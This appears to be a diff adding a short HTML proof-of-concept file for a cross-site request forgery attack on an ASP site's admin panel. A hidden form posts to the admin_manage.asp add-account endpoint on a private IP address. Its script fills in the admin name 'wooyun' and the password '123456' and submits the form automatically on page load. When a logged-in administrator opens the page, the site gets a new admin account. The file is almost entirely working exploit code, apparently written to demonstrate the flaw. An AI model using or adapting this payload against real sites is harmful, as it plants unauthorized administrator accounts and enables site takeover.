@@ -1,0 +1,17 @@
+<html>
+    <div style="display:none">
+        <form action="http://192.168.48.1:8002/admin/admin_manage.asp?act=add" id="poc" name="add" method="post">
+            <input type="hidden" name="admin" value=""/>
+            <input type="hidden" name="password" value=""/>
+            <input type="hidden" name="password3" value=""/>
+            <input type="submit" name="button" value="提交数据"/>
+        </form>
+        <script>
+            var t = document.add;
+            t.admin.value="wooyun";
+            t.password.value="123456";
+            t.password3.value="123456";
+            document.add.submit();
+        </script>
+    </div>
+</html>
